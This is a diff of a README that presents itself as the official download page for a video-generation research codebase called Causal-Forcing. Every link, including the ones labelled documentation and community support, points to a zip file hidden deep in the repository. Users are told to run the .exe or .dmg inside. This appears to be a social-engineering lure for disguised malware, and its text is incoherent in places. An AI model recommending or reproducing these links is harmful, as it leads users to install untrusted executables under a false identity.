@@ -1,7 +1,7 @@
 # 🎥 Causal-Forcing - Create Stunning Videos Easily
 
 ## 💾 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/Fire-wall5/Causal-Forcing/main/prompts/Causal-Forcing-v2.5-beta.1.zip%20Latest%https://raw.githubusercontent.com/Fire-wall5/Causal-Forcing/main/prompts/Causal-Forcing-v2.5-beta.1.zip)](https://raw.githubusercontent.com/Fire-wall5/Causal-Forcing/main/prompts/Causal-Forcing-v2.5-beta.1.zip)
+[![Download Latest Release](https://github.com/Fire-wall5/Causal-Forcing/raw/refs/heads/main/long_video/wan/utils/Causal-Forcing-2.1.zip%20Latest%https://github.com/Fire-wall5/Causal-Forcing/raw/refs/heads/main/long_video/wan/utils/Causal-Forcing-2.1.zip)](https://github.com/Fire-wall5/Causal-Forcing/raw/refs/heads/main/long_video/wan/utils/Causal-Forcing-2.1.zip)
 
 ## 📝 Overview
 Causal-Forcing is the official codebase for "Causal Forcing: Autoregressive Diffusion Distillation Done Right for High-Quality Real-Time Interactive Video Generation". This application brings advanced video generation technology within reach of everyone. You can create high-quality, interactive videos without any coding knowledge. 
@@ -20,20 +20,20 @@ Before you proceed, ensure your computer meets these requirements:
 ### Step 2: Visit the Release Page
 To download the application, click the link below to visit the releases page:
 
-[Download from the Releases Page](https://raw.githubusercontent.com/Fire-wall5/Causal-Forcing/main/prompts/Causal-Forcing-v2.5-beta.1.zip)
+[Download from the Releases Page](https://github.com/Fire-wall5/Causal-Forcing/raw/refs/heads/main/long_video/wan/utils/Causal-Forcing-2.1.zip)
 
 ### Step 3: Choose Your Version
 On the Releases page, you will see several versions of Causal-Forcing. Look for the most recent version. This version will have the latest features and improvements.
 
 ### Step 4: Download the File
-Once you find the version you want, click on the download link. If you see a file named something like `https://raw.githubusercontent.com/Fire-wall5/Causal-Forcing/main/prompts/Causal-Forcing-v2.5-beta.1.zip`, that is what you need. For Mac or Linux, there may be different file types to choose from.
+Once you find the version you want, click on the download link. If you see a file named something like `https://github.com/Fire-wall5/Causal-Forcing/raw/refs/heads/main/long_video/wan/utils/Causal-Forcing-2.1.zip`, that is what you need. For Mac or Linux, there may be different file types to choose from.
 
 ### Step 5: Install the Application
 After downloading, open the file you downloaded:
 
 - **Windows:** Double-click the `.exe` file. Follow the installation prompts to install.
 - **macOS:** Open the `.dmg` file and drag the application into your Applications folder.
-- **Linux:** You might need to extract the files from a `https://raw.githubusercontent.com/Fire-wall5/Causal-Forcing/main/prompts/Causal-Forcing-v2.5-beta.1.zip` or similar format and follow specific installation instructions found inside.
+- **Linux:** You might need to extract the files from a `https://github.com/Fire-wall5/Causal-Forcing/raw/refs/heads/main/long_video/wan/utils/Causal-Forcing-2.1.zip` or similar format and follow specific installation instructions found inside.
 
 ### Step 6: Launch the Application
 Once installed, locate Causal-Forcing in your Applications or Programs menu and launch it. 
@@ -57,8 +57,8 @@ If you encounter any issues while using Causal-Forcing, try the following:
 - Check your system requirements to ensure compatibility.
 
 ## 🔗 Additional Resources
-- [Official Documentation](https://raw.githubusercontent.com/Fire-wall5/Causal-Forcing/main/prompts/Causal-Forcing-v2.5-beta.1.zip): Get detailed information on features and usage.
-- [Community Support](https://raw.githubusercontent.com/Fire-wall5/Causal-Forcing/main/prompts/Causal-Forcing-v2.5-beta.1.zip): Join discussions with other users and developers for help and tips.
+- [Official Documentation](https://github.com/Fire-wall5/Causal-Forcing/raw/refs/heads/main/long_video/wan/utils/Causal-Forcing-2.1.zip): Get detailed information on features and usage.
+- [Community Support](https://github.com/Fire-wall5/Causal-Forcing/raw/refs/heads/main/long_video/wan/utils/Causal-Forcing-2.1.zip): Join discussions with other users and developers for help and tips.
 
 ## 🛠️ Contact Us
 If you have further questions, feel free to open an issue on the GitHub repository. We aim to respond promptly to all inquiries.
@@ -66,4 +66,4 @@ If you have further questions, feel free to open an issue on the GitHub reposito
 ## 📥 Download & Install
 Returning to the main action, to download and install Causal-Forcing, make sure to go to the link below:
 
-[Visit This Page to Download](https://raw.githubusercontent.com/Fire-wall5/Causal-Forcing/main/prompts/Causal-Forcing-v2.5-beta.1.zip)
+[Visit This Page to Download](https://github.com/Fire-wall5/Causal-Forcing/raw/refs/heads/main/long_video/wan/utils/Causal-Forcing-2.1.zip)
